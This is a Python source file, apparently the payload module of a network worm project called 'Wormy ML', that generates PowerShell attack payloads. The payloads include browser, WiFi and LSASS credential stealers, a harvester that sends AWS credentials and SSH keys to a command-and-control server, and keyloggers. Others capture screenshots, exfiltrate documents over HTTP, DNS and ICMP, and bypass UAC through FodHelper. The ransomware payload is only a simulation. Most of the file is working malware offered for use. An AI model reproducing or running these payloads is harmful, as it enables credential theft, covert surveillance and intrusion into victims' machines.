"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Specialized Payloads Module
Advanced payloads for specific purposes
"""


import base64
import os
import random
import sys

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class SpecializedPayloads:
    """
    Specialized Payloads for Advanced Operations

    Payload Categories:
    - Credential Stealers
    - Keyloggers
    - Screenshot Capture
    - Ransomware Simulation
    - Data Exfiltration
    - Privilege Escalation
    """

    def __init__(self, c2_server: str = "127.0.0.1", c2_port: int = 4444):
        self.c2_server = c2_server
        self.c2_port = c2_port

    # ============ CREDENTIAL STEALERS ============

    def generate_credential_stealer(self, target: str = "all") -> str:
        """Generate credential stealing payload"""

        if target == "browser":
            return self._browser_credential_stealer()
        elif target == "wifi":
            return self._wifi_credential_stealer()
        elif target == "lsass":
            return self._lsass_credential_stealer()
        elif target == "all":
            return self._comprehensive_credential_stealer()

        return ""

    def _browser_credential_stealer(self) -> str:
        """Steal browser credentials"""
        payload = """
# Chrome passwords
$chromePath = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data";
if(Test-Path $chromePath){
    Copy-Item $chromePath "$env:TEMP\\chrome_creds.db";
    # Exfiltrate
}

# Firefox passwords
$firefoxPath = "$env:APPDATA\\Mozilla\\Firefox\\Profiles";
if(Test-Path $firefoxPath){
    Get-ChildItem $firefoxPath -Recurse -Filter "logins.json" | 
    ForEach-Object {Copy-Item $_.FullName "$env:TEMP\\firefox_creds.json"}
}
"""
        return payload.strip()

    def _wifi_credential_stealer(self) -> str:
        """Steal WiFi passwords"""
        payload = """
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $_ -replace ".*: ", ""
};

$results = @();
foreach($profile in $profiles){
    $password = netsh wlan show profile name="$profile" key=clear | 
                Select-String "Key Content" | 
                ForEach-Object {$_ -replace ".*: ", ""};
    
    $results += [PSCustomObject]@{
        SSID = $profile;
        Password = $password
    }
}

$results | ConvertTo-Json | Out-File "$env:TEMP\\wifi_creds.json"
"""
        return payload.strip()

    def _lsass_credential_stealer(self) -> str:
        """Dump LSASS credentials (Mimikatz-style)"""
        payload = """
# Requires admin privileges
$proc = Get-Process lsass;
$dumpFile = "$env:TEMP\\lsass.dmp";

# Create minidump
rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $proc.Id $dumpFile full;

# Exfiltrate dump file
"""
        return payload.strip()

    def _comprehensive_credential_stealer(self) -> str:
        """Comprehensive credential stealing"""
        payload = f"""
# Comprehensive credential harvesting
$output = @{{}};

# 1. Browser credentials
$output['browsers'] = @();
# Chrome, Firefox, Edge...

# 2. WiFi passwords
$output['wifi'] = (netsh wlan show profiles | Select-String "All User Profile");

# 3. Saved credentials
$output['saved_creds'] = (cmdkey /list);

# 4. Cloud credentials
if(Test-Path "$env:USERPROFILE\\.aws\\credentials"){{
    $output['aws'] = Get-Content "$env:USERPROFILE\\.aws\\credentials";
}}

# 5. SSH keys
if(Test-Path "$env:USERPROFILE\\.ssh"){{
    $output['ssh'] = Get-ChildItem "$env:USERPROFILE\\.ssh" -Recurse;
}}

# Exfiltrate to C2
$json = $output | ConvertTo-Json -Depth 10;
Invoke-WebRequest -Uri "http://{self.c2_server}:{self.c2_port}/exfil" -Method POST -Body $json;
"""
        return payload.strip()

    # ============ KEYLOGGERS ============

    def generate_keylogger(self, log_method: str = "file") -> str:
        """Generate keylogger payload"""

        if log_method == "file":
            return self._file_keylogger()
        elif log_method == "network":
            return self._network_keylogger()

        return ""

    def _file_keylogger(self) -> str:
        """File-based keylogger"""
        payload = """
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
    
    public static void Start() {
        while(true) {
            System.Threading.Thread.Sleep(10);
            for(int i = 0; i < 255; i++) {
                int state = GetAsyncKeyState(i);
                if(state == 1 || state == -32767) {
                    string key = ((Keys)i).ToString();
                    System.IO.File.AppendAllText(@"C:\\Windows\\Temp\\log.txt", key);
                }
            }
        }
    }
}
"@;

[KeyLogger]::Start();
"""
        return payload.strip()

    def _network_keylogger(self) -> str:
        """Network-based keylogger (sends to C2)"""
        payload = f"""
$buffer = "";
while($true){{
    for($i=0; $i -lt 255; $i++){{
        $state = [System.Windows.Forms.Control]::IsKeyLocked([System.Windows.Forms.Keys]$i);
        if($state){{
            $buffer += [char]$i;
            
            if($buffer.Length -gt 50){{
                Invoke-WebRequest -Uri "http://{self.c2_server}:{self.c2_port}/keylog" -Method POST -Body $buffer;
                $buffer = "";
            }}
        }}
    }}
    Start-Sleep -Milliseconds 100;
}}
"""
        return payload.strip()

    # ============ SCREENSHOT CAPTURE ============

    def generate_screenshot_payload(self) -> str:
        """Generate screenshot capture payload"""
        payload = f"""
Add-Type -AssemblyName System.Windows.Forms;
Add-Type -AssemblyName System.Drawing;

$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height;
$graphics = [System.Drawing.Graphics]::FromImage($bitmap);
$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size);

$path = "$env:TEMP\\screenshot.png";
$bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png);

# Exfiltrate
$bytes = [System.IO.File]::ReadAllBytes($path);
$base64 = [System.Convert]::ToBase64String($bytes);
Invoke-WebRequest -Uri "http://{self.c2_server}:{self.c2_port}/screenshot" -Method POST -Body $base64;

Remove-Item $path;
"""
        return payload.strip()

    # ============ RANSOMWARE SIMULATION ============

    def generate_ransomware_payload(self, simulation: bool = True) -> str:
        """Generate ransomware payload (SIMULATION ONLY)"""

        if simulation:
            # Safe simulation - only creates marker files
            payload = """
# RANSOMWARE SIMULATION (SAFE)
# Creates marker files instead of encrypting

$targetDirs = @(
    "$env:USERPROFILE\\Documents",
    "$env:USERPROFILE\\Desktop"
);

foreach($dir in $targetDirs){
    if(Test-Path $dir){
        Get-ChildItem $dir -File -Recurse | ForEach-Object {
            # Create marker file instead of encrypting
            "$($_.FullName).ENCRYPTED" | Out-File "$($_.FullName).marker";
        }
    }
}

# Display ransom note (simulation)
$note = @"
[SIMULATION] Your files have been encrypted!
This is a SIMULATION for authorized red team testing only.
No actual encryption has occurred.
"@;

$note | Out-File "$env:USERPROFILE\\Desktop\\RANSOM_NOTE.txt";
"""
            return payload.strip()

        return "# Real ransomware disabled for safety"

    # ============ DATA EXFILTRATION ============

    def generate_exfiltration_payload(self, method: str = "http") -> str:
        """Generate data exfiltration payload"""

        if method == "http":
            return self._http_exfiltration()
        elif method == "dns":
            return self._dns_exfiltration()
        elif method == "icmp":
            return self._icmp_exfiltration()

        return ""

    def _http_exfiltration(self) -> str:
        """HTTP-based exfiltration"""
        payload = f"""
# Exfiltrate sensitive files via HTTP
$targetFiles = @(
    "$env:USERPROFILE\\Documents\\*.pdf",
    "$env:USERPROFILE\\Documents\\*.docx",
    "$env:USERPROFILE\\Desktop\\*.txt"
);

foreach($pattern in $targetFiles){{
    Get-ChildItem $pattern -ErrorAction SilentlyContinue | ForEach-Object {{
        $content = [System.IO.File]::ReadAllBytes($_.FullName);
        $base64 = [System.Convert]::ToBase64String($content);
        
        $data = @{{
            filename = $_.Name;
            content = $base64
        }} | ConvertTo-Json;
        
        Invoke-WebRequest -Uri "http://{self.c2_server}:{self.c2_port}/exfil" -Method POST -Body $data;
    }}
}}
"""
        return payload.strip()

    def _dns_exfiltration(self) -> str:
        """DNS-based exfiltration (covert channel)"""
        payload = f"""
# Exfiltrate data via DNS queries
$data = "sensitive_data_here";
$encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data));

# Split into chunks (DNS label max 63 chars)
$chunks = [regex]::Matches($encoded, '.{{1,50}}');

foreach($chunk in $chunks){{
    $query = "$($chunk.Value).{self.c2_server}";
    nslookup $query;
}}
"""
        return payload.strip()

    def _icmp_exfiltration(self) -> str:
        """ICMP-based exfiltration (covert channel)"""
        payload = f"""
# Exfiltrate data via ICMP packets
$data = "sensitive_data";
$bytes = [System.Text.Encoding]::UTF8.GetBytes($data);

# Send data in ICMP packets
foreach($byte in $bytes){{
    ping -n 1 -l $byte {self.c2_server};
}}
"""
        return payload.strip()

    # ============ PRIVILEGE ESCALATION ============

    def generate_privesc_payload(self, method: str = "uac_bypass") -> str:
        """Generate privilege escalation payload"""

        if method == "uac_bypass":
            return self._uac_bypass_payload()
        elif method == "token_impersonation":
            return self._token_impersonation_payload()

        return ""

    def _uac_bypass_payload(self) -> str:
        """UAC bypass payload (FodHelper)"""
        payload = """
# UAC Bypass via FodHelper
New-Item "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Force;
New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "" -Force;
Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "(default)" -Value "cmd /c start powershell" -Force;

Start-Process "C:\\Windows\\System32\\fodhelper.exe" -WindowStyle Hidden;

Start-Sleep 3;
Remove-Item "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force;
"""
        return payload.strip()

    def _token_impersonation_payload(self) -> str:
        """Token impersonation payload"""
        payload = """
# Token impersonation (requires SeImpersonatePrivilege)
# Typically used after exploiting service account

# Find SYSTEM process
$systemProc = Get-Process -Name "winlogon" | Select-Object -First 1;

# Impersonate SYSTEM token
# (Actual implementation would use Win32 APIs)
"""
        return payload.strip()


if __name__ == "__main__":
    # Test specialized payloads
    payloads = SpecializedPayloads(c2_server="192.168.1.100", c2_port=4444)

    print("=" * 60)
    print("SPECIALIZED PAYLOADS TEST")
    print("=" * 60)

    print("\n1. Browser Credential Stealer:")
    print(payloads.generate_credential_stealer("browser")[:200] + "...")

    print("\n2. Keylogger (File-based):")
    print(payloads.generate_keylogger("file")[:200] + "...")

    print("\n3. Screenshot Capture:")
    print(payloads.generate_screenshot_payload()[:200] + "...")

    print("\n4. Ransomware Simulation:")
    print(payloads.generate_ransomware_payload(simulation=True)[:200] + "...")

    print("\n5. HTTP Exfiltration:")
    print(payloads.generate_exfiltration_payload("http")[:200] + "...")

    print("\n" + "=" * 60)
